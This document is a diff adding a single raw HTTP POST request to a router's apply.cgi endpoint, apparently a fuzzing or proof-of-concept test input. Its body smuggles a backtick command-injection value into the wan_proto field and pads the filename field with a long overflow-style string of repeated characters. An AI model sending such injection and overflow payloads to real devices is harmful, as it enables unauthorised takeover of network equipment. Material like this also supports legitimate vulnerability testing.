@@ -1,0 +1,6 @@
+POST /apply.cgi?/USB_browse.htm?openfile=USB_Folder_creat.htm HTTP/1.1
+Content-Type: application/json
+Host: 31
+Content-Length: 332
+
+wan_proto=pptp;`wzq`&%20timestamp=pppoe&submit_flag=plc_dev_config&filename=aaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
